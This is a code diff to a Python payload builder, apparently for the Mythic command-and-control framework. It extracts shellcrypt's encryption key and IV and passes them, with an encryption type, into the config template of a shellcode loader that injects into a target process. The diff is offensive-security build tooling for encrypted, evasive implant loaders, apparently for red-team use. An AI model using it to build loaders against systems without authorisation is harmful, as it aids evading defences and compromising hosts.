@@ -1143,6 +1143,17 @@ generated if none have been entered.""",
             ))
 
             ######################### Shellcode Obfuscation Section #########################
+            # Defaults for config template rendering (may be updated after shellcrypt output)
+            encryption_type_map = {
+                "NONE": 0,
+                "XOR": 1,
+                "RC4": 2,
+                "AES_ECB": 3,
+                "AES_CBC": 4,
+            }
+            encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
+            encryption_key_bytes = "0x00"
+            encryption_iv_bytes = ", ".join(["0x00"] * 16)
             with open(str(mythic_shellcode_path), "rb") as f:
                 header = f.read(2)
                 if header == b"\x4d\x5a":
@@ -1212,6 +1223,39 @@ generated if none have been entered.""",
                 output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
+                # Always get shellcrypt output in C format to extract key/IV for config template
+                try:
+                    import re
+                    key_cmd = [
+                        "python",
+                        shellcrypt_path,
+                        "-i", mythic_shellcode_path,
+                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                        "-f", "c",
+                        "-a", "shellcode",
+                    ]
+
+                    if self.get_parameter("2.2 Encryption Key") != "NONE":
+                        key_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
+
+                    if self.get_parameter("2.0 Compression Type") != "NONE":
+                        key_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
+
+                    if self.get_parameter("2.3 Encoding Type") != "NONE":
+                        key_cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]
+
+                    shellcode_src = subprocess.check_output(key_cmd, text=True)
+
+                    key_match = re.search(r"unsigned char\s+key\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
+                    if key_match:
+                        encryption_key_bytes = ", ".join(x.strip() for x in key_match.group(1).split(",") if x.strip())
+
+                    iv_match = re.search(r"unsigned char\s+iv\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
+                    if iv_match:
+                        encryption_iv_bytes = ", ".join(x.strip() for x in iv_match.group(1).split(",") if x.strip())
+                except Exception as e:
+                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"
+
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                     shutil.copy(src=str(obfuscated_shellcode_path),
@@ -1365,11 +1409,14 @@ generated if none have been entered.""",
                         StepSuccess=True,
                     ))
 
-                # Load and render the config.hpp template
+                # Load and render the config template
                 config_template = environment.get_template("config.hpp")
                 config_data = {
                     "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
                     "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                    "ENCRYPTION_TYPE": encryption_type_value,
+                    "ENCRYPTION_KEY": encryption_key_bytes,
+                    "ENCRYPTION_IV": encryption_iv_bytes,
                 }
                 rendered_config = config_template.render(**config_data)
 
@@ -1452,11 +1499,14 @@ generated if none have been entered.""",
                     config_hpp_destination = str(config_hpp_destination)
 
                     try:
-                        # Load and render the config.hpp template
+                        # Load and render the config template
                         config_template = environment.get_template("config.hpp")
                         config_data = {
                             "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
                             "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                            "ENCRYPTION_TYPE": encryption_type_value,
+                            "ENCRYPTION_KEY": encryption_key_bytes,
+                            "ENCRYPTION_IV": encryption_iv_bytes,
                         }
                         rendered_config = config_template.render(**config_data)
 
